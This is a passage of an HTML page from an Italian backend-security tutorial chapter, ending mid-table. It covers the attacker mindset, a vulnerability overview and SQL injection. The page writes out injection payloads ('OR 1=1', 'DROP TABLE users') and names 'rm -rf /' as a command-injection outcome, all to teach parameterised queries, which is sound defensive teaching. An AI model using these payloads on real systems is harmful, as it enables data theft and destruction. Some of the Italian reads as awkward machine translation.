@@ -1,0 +1,2557 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="referrer" content="no-referrer"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sicurezza del backend / Capitolo 17 / Backend dai primi principi</title>
+  <meta name="description" content="Capitolo 17 di Backend dai primi principi: sicurezza del backend. Note sui principi primi, diagrammi ed esempi eseguibili in Go e Python.">
+  <meta name="theme-color" content="#f3ede2">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2032%2032'%3E%3Crect%20width='32'%20height='32'%20rx='7'%20fill='%23b8402e'/%3E%3Ctext%20x='16'%20y='23'%20font-family='Georgia,serif'%20font-size='19'%20font-weight='700'%20fill='%23f3ede2'%20text-anchor='middle'%3EB%3C/text%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <style>
+        :root{
+  --cream: #f3ede2;
+  --cream-dark: #ece3d4;
+  --ink: #211e1a;
+  --ink-light: #5b5347;
+  --red: #b8402e;
+  --red-dark: #8f2f20;
+  --gold: #b07d2b;
+  --green: #3f6f4e;
+  --border: #d8cfbe;
+  --code-bg: #232019;
+  --code-text: #e9e2d3;
+  --sidebar-w: 280px;
+}
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family:"Spline Sans", system-ui, sans-serif;
+            background: var(--cream);
+            color: var(--ink);
+            
+            min-height: 100vh;
+            font-size: 17px;
+            line-height: 1.7;
+        }
+
+        /* SIDEBAR */
+        aside {
+            width: var(--sidebar-w);
+            min-height: 100vh;
+            background: var(--cream-dark);
+            border-right: 1px solid var(--border);
+            padding: 36px 20px 40px;
+            position: sticky;
+            top: 0;
+            align-self: flex-start;
+            height: 100vh;
+            overflow-y: auto;
+        }
+
+        /* MAIN */
+        .bfp-content {
+            flex: 1;
+            max-width: 860px;
+            padding: 60px 64px 100px;
+        }
+
+        .chapter-label {
+            font-family:"Spline Sans", system-ui, sans-serif;
+            font-size: 11px;
+            letter-spacing: .16em;
+            text-transform: uppercase;
+            color: var(--red);
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        h1.chapter-title {
+            font-family:"Fraunces", Georgia, serif;
+            font-weight: 900;
+            font-size: 48px;
+            line-height: 1.1;
+            color: var(--ink);
+            margin-bottom: 24px;
+        }
+
+        .chapter-intro {
+            font-size: 18px;
+            color: var(--ink-light);
+            line-height: 1.8;
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+            padding: 20px 0;
+            margin-bottom: 52px;
+        }
+
+        section {
+            margin-bottom: 60px;
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--red);
+            color: #fff;
+            font-family:"Spline Sans", system-ui, sans-serif;
+            font-weight: 700;
+            font-size: 13px;
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            flex-shrink: 0;
+        }
+
+        h2 {
+            font-family:"Fraunces", Georgia, serif;
+            font-weight: 700;
+            font-size: 28px;
+            color: var(--ink);
+        }
+
+        h3 {
+            font-family:"Fraunces", Georgia, serif;
+            font-weight: 700;
+            font-size: 20px;
+            color: var(--ink);
+            margin: 32px 0 12px;
+        }
+
+        h4 {
+            font-family:"Spline Sans", system-ui, sans-serif;
+            font-weight: 700;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: .07em;
+            color: var(--red-dark);
+            margin: 20px 0 8px;
+        }
+
+        p {
+            margin-bottom: 16px;
+        }
+
+        /* CALLOUTS */
+        .callout {
+            background: var(--cream-dark);
+            border-left: 4px solid var(--red);
+            border-radius: 0 8px 8px 0;
+            padding: 16px 20px;
+            margin: 24px 0;
+            font-size: 15.5px;
+        }
+
+        .callout::before {
+            content: "Note  ";
+            font-weight: 700;
+            color: var(--red);
+        }
+
+        .callout.tip {
+            border-color: var(--gold);
+        }
+
+        .callout.tip::before {
+            content: "Tip  ";
+            font-weight: 700;
+            color: var(--gold);
+        }
+
+        .callout.warning {
+            border-color: #b07d2b;
+        }
+
+        .callout.warning::before {
+            content: "Warning  ";
+            font-weight: 700;
+            color: #b8402e;
+        }
+
+        .callout.security {
+            border-color: #37607f;
+            background: #dee5ee;
+        }
+
+        .callout.security::before {
+            content: "Security  ";
+            font-weight: 700;
+            color: #37607f;
+        }
+
+        .callout.danger {
+            border-color: var(--red);
+            background: #f4ded6;
+        }
+
+        .callout.danger::before {
+            content: "Danger  ";
+            font-weight: 700;
+            color: var(--red);
+        }
+
+        /* CODE */
+        pre {
+            background: var(--code-bg);
+            color: var(--code-text);
+            font-family:"JetBrains Mono", ui-monospace, monospace;
+            font-size: 13.5px;
+            line-height: 1.65;
+            border-radius: 10px;
+            padding: 22px 24px;
+            overflow-x: auto;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        pre .lang-label {
+            position: absolute;
+            top: 10px;
+            right: 14px;
+            font-size: 10px;
+            letter-spacing: .1em;
+            text-transform: uppercase;
+            color: #9c948a;
+            font-family:"Spline Sans", system-ui, sans-serif;
+        }
+
+        code {
+            font-family:"JetBrains Mono", ui-monospace, monospace;
+            font-size: 13px;
+            background: #e6dcca;
+            color: var(--red-dark);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        pre code {
+            background: none;
+            color: inherit;
+            padding: 0;
+            font-size: inherit;
+            border-radius: 0;
+        }
+
+        .kw {
+            color: #e0896a
+        }
+
+        .str {
+            color: #a9c98a
+        }
+
+        .cmt {
+            color: #7d7468;
+            font-style: italic
+        }
+
+        .fn {
+            color: #7fb0c9
+        }
+
+        .num {
+            color: #d8b66a
+        }
+
+        .type {
+            color: #c58fb0
+        }
+
+        /* DIAGRAM */
+        .diagram-box {
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 28px 0;
+            background: var(--cream);
+        }
+
+        .diagram-caption {
+            text-align: center;
+            font-family:"Spline Sans", system-ui, sans-serif;
+            font-size: 12.5px;
+            color: var(--ink-light);
+            padding: 8px 0 12px;
+            letter-spacing: .04em;
+        }
+
+        /* TABLE */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 24px 0;
+            font-size: 15px;
+            font-family:"Spline Sans", system-ui, sans-serif;
+        }
+
+        th {
+            background: var(--ink);
+            color: var(--cream);
+            padding: 10px 14px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 13px;
+            letter-spacing: .05em;
+            text-transform: uppercase;
+        }
+
+        td {
+            padding: 10px 14px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        tr:nth-child(even) td {
+            background: var(--cream-dark);
+        }
+
+        /* LISTS */
+        ul,
+        ol {
+            padding-left: 24px;
+            margin-bottom: 16px;
+        }
+
+        li {
+            margin-bottom: 8px;
+        }
+
+        li strong {
+            color: var(--red-dark);
+        }
+
+        blockquote {
+            border-left: 3px solid var(--gold);
+            margin: 24px 0;
+            padding: 12px 20px;
+            font-style: italic;
+            color: var(--ink-light);
+            font-size: 17px;
+        }
+
+        /* COMPARE GRID */
+        .compare-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin: 24px 0;
+        }
+
+        .compare-card {
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 18px 20px;
+            background: var(--cream);
+        }
+
+        .compare-card h4 {
+            font-family:"Spline Sans", system-ui, sans-serif;
+            font-weight: 700;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: .1em;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid var(--red);
+            color: var(--red);
+            margin-top: 0;
+        }
+
+        .compare-card ul {
+            margin: 0;
+            padding-left: 18px;
+        }
+
+        .compare-card li {
+            font-size: 14.5px;
+            margin-bottom: 6px;
+        }
+
+        /* VULN CARDS */
+        .vuln-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 12px;
+            margin: 24px 0;
+        }
+
+        .vuln-card {
+            border-radius: 10px;
+            padding: 14px 16px;
+            border: 1px solid var(--border);
+        }
+
+        .vuln-card .vc-title {
+            font-family:"Spline Sans", system-ui, sans-serif;
+            font-weight: 700;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: .08em;
+            margin-bottom: 6px;
+        }
+
+        .vc-sql {
+            background: #f0e5c9;
+            border-top: 3px solid #b07d2b;
+        }
+
+        .vc-sql .vc-title {
+            color: #b8402e;
+        }
+
+        .vc-cmd {
+            background: #f4ded6;
+            border-top: 3px solid var(--red);
+        }
+
+        .vc-cmd .vc-title {
+            color: var(--red-dark);
+        }
+
+        .vc-xss {
+            background: #e0e9dd;
+            border-top: 3px solid #3f6f4e;
+        }
+
+        .vc-xss .vc-title {
+            color: #3f6f4e;
+        }
+
+        .vc-auth {
+            background: #dee5ee;
+            border-top: 3px solid #37607f;
+        }
+
+        .vc-auth .vc-title {
+            color: #37607f;
+        }
+
+        .vc-bola {
+            background: #dee5ee;
+            border-top: 3px solid #37607f;
+        }
+
+        .vc-bola .vc-title {
+            color: #37607f;
+        }
+
+        .vc-csrf {
+            background: #f0e5c9;
+            border-top: 3px solid var(--gold);
+        }
+
+        .vc-csrf .vc-title {
+            color: #b07d2b;
+        }
+
+        /* REF LINKS */
+        .ref-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .ref-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--cream-dark);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 6px 12px;
+            font-family:"Spline Sans", system-ui, sans-serif;
+            font-size: 13px;
+            color: var(--red-dark);
+            text-decoration: none;
+            transition: background .15s;
+        }
+
+        .ref-link:hover {
+            background: var(--border);
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 48px 0;
+        }
+
+        a {
+            color: var(--red-dark);
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 3px;
+        }
+    
+    /* ---- responsive ---- */
+    @media (max-width: 900px) {
+      body {  }
+      .bfp-content { max-width: none; padding: 38px 22px 100px; }}
+    @media (max-width: 560px) {
+      .bfp-content { padding: 30px 18px 100px; }}</style>
+<style>
+.chapter-nav{position:fixed;bottom:0;left:0;right:0;z-index:9998;display:flex;align-items:center;justify-content:space-between;padding:14px clamp(16px,4vw,48px);background:rgba(243,237,226,.88);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);border-top:1.5px solid #c7bca6;box-shadow:0 -8px 32px -16px rgba(40,30,20,.18);font-family:"JetBrains Mono", ui-monospace, monospace;}
+.nav-chapter-link{display:flex;align-items:center;gap:12px;text-decoration:none;color:#5b5347;padding:10px 18px;border-radius:10px;transition:all .2s ease;max-width:38%;}
+.nav-chapter-link:hover{background:rgba(184,64,46,.08);color:#b8402e;transform:translateY(-1px);}
+.nav-chapter-link.nav-next{text-align:right;flex-direction:row;}
+.nav-arrow{font-size:22px;color:#b8402e;font-weight:700;flex:none;}
+.nav-label{display:flex;flex-direction:column;gap:2px;font-size:13.5px;line-height:1.3;}
+.nav-small{font-size:10px;letter-spacing:.22em;text-transform:uppercase;color:#8d8475;font-weight:600;}
+.nav-indicator{font-size:12px;letter-spacing:.18em;text-transform:uppercase;color:#b8402e;font-weight:700;text-decoration:none;padding:8px 16px;border:1.5px solid #c7bca6;border-radius:40px;background:rgba(255,255,255,.5);transition:all .2s;white-space:nowrap;}
+.nav-indicator:hover{background:#b8402e;color:#fff;border-color:#b8402e;}
+.nav-dot{display:inline-block;width:7px;height:7px;background:#b8402e;border-radius:50%;margin-right:4px;vertical-align:middle;}
+.nav-sep{color:#c7bca6;margin:0 2px;}
+.nav-disabled{visibility:hidden;pointer-events:none;}
+@media(max-width:700px){.nav-label{font-size:11.5px;}.nav-chapter-link{padding:8px 10px;max-width:38%;}.chapter-nav{padding:10px 12px;}.nav-small{font-size:9px;letter-spacing:.16em;}}
+@media(max-width:520px){.nav-label{display:none;}.nav-chapter-link{max-width:none;padding:8px 12px;}.nav-arrow{font-size:20px;}.nav-indicator{font-size:11px;padding:7px 13px;letter-spacing:.12em;}}
+body{padding-bottom:80px;}
+</style>
+  <link rel="stylesheet" href="../../assets/copy-button.css">
+  <link rel="stylesheet" href="../../assets/enhancements.css">
+  <link rel="stylesheet" href="../../assets/shell.css">
+  <link rel="stylesheet" href="../../assets/theme.css">
+  <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;0,9..144,700;0,9..144,900;1,9..144,400;1,9..144,600&family=Spline+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="../../assets/theme.js"></script>
+</head>
+
+<body>
+<button class="bfp-toc-toggle" id="bfpTocToggle" aria-controls="bfpToc" aria-expanded="false"><svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true"><line x1="2" y1="4" x2="14" y2="4"/><line x1="2" y1="8" x2="14" y2="8"/><line x1="2" y1="12" x2="14" y2="12"/></svg>Contenuto</button>
+<div class="bfp-toc-scrim" id="bfpTocScrim"></div>
+<div class="bfp-shell">
+    <aside class="bfp-toc" id="bfpToc">
+      <div class="bfp-brand"><span class="bfp-brand-name">Sicurezza</span><span class="bfp-brand-slash">/</span><span class="bfp-brand-lens">l'obiettivo del back-end</span></div>
+      <div class="bfp-brand-sub">Capitolo 17/Manuale da campo</div>
+      <div class="bfp-toc-rule"></div>
+      <nav class="bfp-toc-nav">
+        <a class="bfp-toc-link" href="#mindset"><span class="bfp-toc-num">01</span><span class="bfp-toc-text">La mentalità della sicurezza</span></a>
+        <a class="bfp-toc-link" href="#overview"><span class="bfp-toc-num">02</span><span class="bfp-toc-text">Panoramica delle vulnerabilità</span></a>
+        <a class="bfp-toc-link" href="#sql"><span class="bfp-toc-num">03</span><span class="bfp-toc-text">Iniezione SQL</span></a>
+        <a class="bfp-toc-link" href="#cmd"><span class="bfp-toc-num">04</span><span class="bfp-toc-text">Iniezione di comando</span></a>
+        <a class="bfp-toc-link" href="#passwords"><span class="bfp-toc-num">05</span><span class="bfp-toc-text">Memorizzazione della password</span></a>
+        <a class="bfp-toc-link" href="#sessions"><span class="bfp-toc-num">06</span><span class="bfp-toc-text">Sessioni e cookie</span></a>
+        <a class="bfp-toc-link" href="#jwt"><span class="bfp-toc-num">07</span><span class="bfp-toc-text">JWT, Aut. senza stato</span></a>
+        <a class="bfp-toc-link" href="#ratelimit"><span class="bfp-toc-num">08</span><span class="bfp-toc-text">Aut. limitazione velocità</span></a>
+        <a class="bfp-toc-link" href="#authz"><span class="bfp-toc-num">09</span><span class="bfp-toc-text">Autorizzazione (BOLA/BFLA)</span></a>
+        <a class="bfp-toc-link" href="#xss"><span class="bfp-toc-num">10</span><span class="bfp-toc-text">XSS</span></a>
+        <a class="bfp-toc-link" href="#csrf"><span class="bfp-toc-num">11</span><span class="bfp-toc-text">CSRF</span></a>
+        <a class="bfp-toc-link" href="#misconfig"><span class="bfp-toc-num">12</span><span class="bfp-toc-text">Errate configurazioni</span></a>
+        <a class="bfp-toc-link" href="#layers"><span class="bfp-toc-num">13</span><span class="bfp-toc-text">Difesa a strati</span></a>
+        <a class="bfp-toc-link" href="#code-go"><span class="bfp-toc-num">14</span><span class="bfp-toc-text">Vai, esempi sicuri</span></a>
+        <a class="bfp-toc-link" href="#code-py"><span class="bfp-toc-num">15</span><span class="bfp-toc-text">Python, esempi sicuri</span></a>
+        <a class="bfp-toc-link" href="#oauth"><span class="bfp-toc-num">16</span><span class="bfp-toc-text">OAuth 2.0/OIDC</span></a>
+        <a class="bfp-toc-link" href="#tls"><span class="bfp-toc-num">17</span><span class="bfp-toc-text">Interni HTTPS e TLS</span></a>
+        <a class="bfp-toc-link" href="#pentest"><span class="bfp-toc-num">18</span><span class="bfp-toc-text">Mentalità Pentest</span></a>
+        <a class="bfp-toc-link" href="#incidents"><span class="bfp-toc-num">19</span><span class="bfp-toc-text">Casi di studio di incidenti reali</span></a>
+        <a class="bfp-toc-link" href="#refs"><span class="bfp-toc-num">20</span><span class="bfp-toc-text">Riferimenti</span></a>
+      </nav>
+    </aside>
+    <main class="bfp-content">
+
+        <div class="chapter-label">Un riferimento dettagliato al backend</div>
+        <h1 class="chapter-title">Sicurezza del back-end</h1>
+        <p class="chapter-intro">
+            La sicurezza non è una caratteristica a cui ti iscrivi alla fine, è una mentalità che porti in ogni riga di codice. Questo
+            Il capitolo copre le classi di attacco di maggior impatto che un ingegnere di backend incontrerà: attacchi di injection,
+            autenticazione interrotta, autorizzazione interrotta, XSS, CSRF e configurazione errata, con i modelli mentali e
+            codice per prevenirli tutti.
+        </p>
+
+        <!-- 01 MINDSET -->
+        <section id="mindset">
+            <div class="section-header"><span class="badge">01</span>
+                <h2>La mentalità della sicurezza: pensare come un attaccante</h2>
+            </div>
+
+            <blockquote>&quot;Agli aggressori non interessa il contesto o il linguaggio che usate. Fanno solo una domanda: dove è finito
+                lo sviluppatore fa un'ipotesi?&quot;</blockquote>
+
+            <p>Ogni vulnerabilità significativa nella storia del software è riconducibile a uno sviluppatore che ha dato per scontato qualcosa
+                che un utente malintenzionato ha violato:</p>
+            <ul>
+                <li>Supponendo che l'input proveniente dall'utente sia pulito e ben formato.</li>
+                <li>Supponendo che l'utente sia chi afferma di essere.</li>
+                <li>Supponendo che la richiesta provenga dal tuo front-end.</li>
+                <li>Supponendo che nessuno apra la scheda di rete del browser e modifichi i parametri.</li>
+            </ul>
+
+            <p>Queste ipotesi sembrano ragionevoli sotto la pressione delle scadenze, pensi sempre al <strong>felice
+                    percorso</strong>. Gli aggressori sfruttano il <em>percorsi infelici</em>. Colpiscono ogni confine, modificano
+                ogni input e prova a indovinare ogni ipotesi che hai fatto.</p>
+
+            <div class="callout tip">Lo scopo di questo capitolo è renderti <strong>paranoico</strong>: in modo produttivo
+                modo. Ogni volta che scrivi il codice, chiedi: <em>&quot;Cosa potrebbe andare storto qui? Cosa sto supponendo? E se quello
+                    supposizione è sbagliata?&quot;</em></div>
+
+            <h3>La causa principale di quasi tutti gli attacchi</h3>
+            <p>La tua applicazione backend parla <strong>più lingue contemporaneamente</strong>: SQL nel database,
+                HTML/JS al browser, comandi shell al sistema operativo. Ogni lingua ha la sua grammatica, la sua particolarità
+                caratteri, il suo modo di separare i comandi dai dati.</p>
+
+            <div class="diagram-box">
+                <svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" width="100%">
+                    <rect width="680" height="200" fill="#fff" />
+                    <defs>
+                        <marker id="ma" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#5b5347" />
+                        </marker>
+                        <marker id="mb" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#b8402e" />
+                        </marker>
+                    </defs>
+                    <!-- Backend center -->
+                    <rect x="260" y="70" width="160" height="60" rx="10" fill="#211e1a" />
+                    <text x="340" y="97" text-anchor="middle" fill="#f3ede2" font-family="Playfair Display,serif"
+                        font-size="14" font-weight="700">Il tuo back-end</text>
+                    <text x="340" y="116" text-anchor="middle" fill="#d8cfbe" font-family="Source Sans 3,sans-serif"
+                        font-size="11">parla più di 3 lingue</text>
+                    <!-- Database -->
+                    <rect x="30" y="80" width="140" height="42" rx="8" fill="#ece3d4" stroke="#d8cfbe" />
+                    <text x="100" y="98" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Banca dati</text>
+                    <text x="100" y="114" text-anchor="middle" fill="#b8402e" font-family="JetBrains Mono,monospace"
+                        font-size="10">linguaggio: SQL</text>
+                    <line x1="172" y1="101" x2="258" y2="101" stroke="#5b5347" stroke-width="1.5"
+                        marker-end="url(#ma)" />
+                    <!-- Browser -->
+                    <rect x="510" y="50" width="140" height="42" rx="8" fill="#ece3d4" stroke="#d8cfbe" />
+                    <text x="580" y="68" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Navigatore</text>
+                    <text x="580" y="84" text-anchor="middle" fill="#b8402e" font-family="JetBrains Mono,monospace"
+                        font-size="10">linguaggio: HTML/JS</text>
+                    <line x1="422" y1="90" x2="508" y2="71" stroke="#5b5347" stroke-width="1.5" marker-end="url(#ma)" />
+                    <!-- OS -->
+                    <rect x="510" y="110" width="140" height="42" rx="8" fill="#ece3d4" stroke="#d8cfbe" />
+                    <text x="580" y="128" text-anchor="middle" fill="#211e1a" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Sistema operativo/Shell</text>
+                    <text x="580" y="144" text-anchor="middle" fill="#b8402e" font-family="JetBrains Mono,monospace"
+                        font-size="10">linguaggio: conchiglia</text>
+                    <line x1="422" y1="110" x2="508" y2="131" stroke="#5b5347" stroke-width="1.5"
+                        marker-end="url(#ma)" />
+                    <!-- Vulnerability label -->
+                    <text x="340" y="170" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="11" font-weight="700">Vulnerabilità: l'input dell'utente in una lingua si riversa
+                        un altro</text>
+                </svg>
+                <div class="diagram-caption">Fig 1: il tuo backend parla più lingue. Ogni attraversamento del confine lo è
+                    un potenziale punto di iniezione.</div>
+            </div>
+
+            <p>Gli attacchi injection si verificano quando i dati dell'utente (che risiedono in una lingua) si riversano in quelli di un'altra lingua
+                contesto e viene interpretato come a <em>comando</em> piuttosto che <em>dati</em>. Questa singola intuizione
+                spiega SQL injection, command injection, XSS e altro.</p>
+        </section>
+
+        <!-- 02 OVERVIEW -->
+        <section id="overview">
+            <div class="section-header"><span class="badge">02</span>
+                <h2>Panoramica delle vulnerabilità</h2>
+            </div>
+            <div class="vuln-grid">
+                <div class="vuln-card vc-sql">
+                    <div class="vc-title">Iniezione SQL</div>
+                    <p style="font-size:13.5px;margin:0">L'input dell'utente si inserisce nella query SQL. L'attaccante può leggere tutti i dati,
+                        eliminare tabelle o eseguire comandi del sistema operativo tramite DB.</p>
+                </div>
+                <div class="vuln-card vc-cmd">
+                    <div class="vc-title">Iniezione di comando</div>
+                    <p style="font-size:13.5px;margin:0">L'input dell'utente si inserisce in un comando shell. L'attaccante può scappare
+                        <code>rm -rf /</code> o installa spyware sul tuo server.</p>
+                </div>
+                <div class="vuln-card vc-xss">
+                    <div class="vc-title">XSS</div>
+                    <p style="font-size:13.5px;margin:0">Contenuti utente archiviati come HTML. Lo script dannoso viene eseguito in altri
+                        browser degli utenti, ruba sessioni, reindirizzamenti, phishing.</p>
+                </div>
+                <div class="vuln-card vc-auth">
+                    <div class="vc-title">Autenticazione interrotta</div>
+                    <p style="font-size:13.5px;margin:0">Password in testo semplice, hashing debole, ID di sessione prevedibili,
+                        limiti di velocità mancanti, l'aggressore prende il controllo degli account.</p>
+                </div>
+                <div class="vuln-card vc-bola">
+                    <div class="vc-title">Autorizzazione interrotta (BOLA/BFLA)</div>
+                    <p style="font-size:13.5px;margin:0">Controllo dell'autenticazione a livello di routing ma non a livello DB. L'utente A legge
+                        Fatture dell'utente B. Il membro accede all'API di amministrazione.</p>
+                </div>
+                <div class="vuln-card vc-csrf">
+                    <div class="vc-title">CSRF/Configurazione errata</div>
+                    <p style="font-size:13.5px;margin:0">Server trucco per l'invio di moduli tra siti. Segreti in Git, debug
+                        log in produzione, flag cookie errati.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 03 SQL INJECTION -->
+        <section id="sql">
+            <div class="section-header"><span class="badge">03</span>
+                <h2>Iniezione SQL</h2>
+            </div>
+
+            <p>L'SQL injection è da decenni la vulnerabilità più distruttiva n. 1. Funziona perché gli sviluppatori
+                creare query SQL tramite <strong>concatenazione di stringhe</strong>: rilasciando l'input utente non elaborato direttamente nel file
+                modello di interrogazione.</p>
+
+            <h3>L'attacco: passo dopo passo</h3>
+            <p>Considera una query di accesso creata per concatenazione:</p>
+
+            <pre><span class="lang-label">SQL / Vulnerable (Never Do This)</span><span class="cmt">-- Template on server:</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users <span class="kw">WHERE</span> email = '<span class="num">' + userInput + '</span>'
+
+<span class="cmt">-- Happy path (Alice logs in normally):</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users <span class="kw">WHERE</span> email = <span class="str">'alice@gmail.com'</span>
+<span class="cmt">-- Returns Alice's row </span>
+
+<span class="cmt">-- Attacker types:  ' OR '1'='1 --</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users <span class="kw">WHERE</span> email = <span class="str">''</span> <span class="kw">OR</span> <span class="str">'1'</span>=<span class="str">'1'</span> <span class="cmt">--'</span>
+<span class="cmt">-- Returns ALL users &lt;- data leak</span>
+
+<span class="cmt">-- Attacker types:  '; DROP TABLE users; --</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> users <span class="kw">WHERE</span> email = <span class="str">''</span>; <span class="kw">DROP TABLE</span> users; <span class="cmt">--'</span>
+<span class="cmt">-- Deletes your entire users table</span></pre>
+
+            <div class="diagram-box">
+                <svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" width="100%">
+                    <rect width="680" height="200" fill="#fff" />
+                    <defs>
+                        <marker id="sq1" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#b8402e" />
+                        </marker>
+                        <marker id="sq2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto">
+                            <path d="M0,0 L5,3 L0,6 Z" fill="#3f6f4e" />
+                        </marker>
+                    </defs>
+                    <!-- Left: attacker input -->
+                    <rect x="20" y="60" width="160" height="80" rx="8" fill="#f4ded6" stroke="#b8402e" />
+                    <text x="100" y="85" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Ingresso dell'attaccante</text>
+                    <text x="100" y="105" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="10">' OPPURE '1'='1 --</text>
+                    <text x="100" y="122" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="10">'; Utenti DROP TABLE;--</text>
+                    <!-- Arrow: Bad path -->
+                    <line x1="182" y1="100" x2="240" y2="100" stroke="#b8402e" stroke-width="2" stroke-dasharray="5 3"
+                        marker-end="url(#sq1)" />
+                    <text x="210" y="92" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">concatenazione di stringhe</text>
+                    <!-- Bad: DB -->
+                    <rect x="242" y="60" width="160" height="80" rx="8" fill="#f4ded6" stroke="#b8402e" />
+                    <text x="322" y="85" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Modello SQL</text>
+                    <text x="322" y="103" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="9">DOVE e-mail = '' O</text>
+                    <text x="322" y="118" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="9">'1'='1' -- &lt;- codice!</text>
+                    <text x="322" y="133" text-anchor="middle" fill="#b8402e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">dati trattati come codice</text>
+                    <!-- Arrow: Fix -->
+                    <line x1="404" y1="100" x2="460" y2="100" stroke="#3f6f4e" stroke-width="2"
+                        marker-end="url(#sq2)" />
+                    <text x="432" y="92" text-anchor="middle" fill="#3f6f4e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">parametrizzato</text>
+                    <!-- Good: DB -->
+                    <rect x="462" y="60" width="190" height="80" rx="8" fill="#e0e9dd" stroke="#3f6f4e" />
+                    <text x="557" y="85" text-anchor="middle" fill="#3f6f4e" font-family="Source Sans 3,sans-serif"
+                        font-size="12" font-weight="700">Parametrizzato</text>
+                    <text x="557" y="103" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="9">DOVE e-mail = $1</text>
+                    <text x="557" y="118" text-anchor="middle" fill="#5b5347" font-family="JetBrains Mono,monospace"
+                        font-size="9">argomenti: [&quot;' OR '1'='1&quot;]</text>
+                    <text x="557" y="133" text-anchor="middle" fill="#3f6f4e" font-family="Source Sans 3,sans-serif"
+                        font-size="10">trattati esclusivamente come stringhe</text>
+                </svg>
+                <div class="diagram-caption">Fig 2: la concatenazione di stringhe confonde codice e dati. Query parametrizzate
+                    separarli definitivamente.</div>
+            </div>
+
+            <h3>Come i caratteri SQL speciali abilitano l'attacco</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Carattere</th>
+                        <th>Significato in SQL</th>
+                        <th>Come lo usa l'attaccante</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>'</code></td>
+                        <td>Delimitatore di stringa</td>
+                        <td>Chiude la stringa letterale esistente, sfugge al contesto dei dati</td>
+                    </tr>
+                    <tr>
+                        <td><code>;</code></td>
+                        <td>Separatore di istruzioni</td>
+                        <td>Termina la query legittima; ne inizia uno nuovo dannoso</td>
+                    </tr>
+                    <tr>
+                        <td><code>--</code></td>
+                        <td>Commento alla riga</td>
+                        <td>Commenta il resto della query originale (trailing <code>'</code>)</td>
+                    </tr>
+                    <tr>
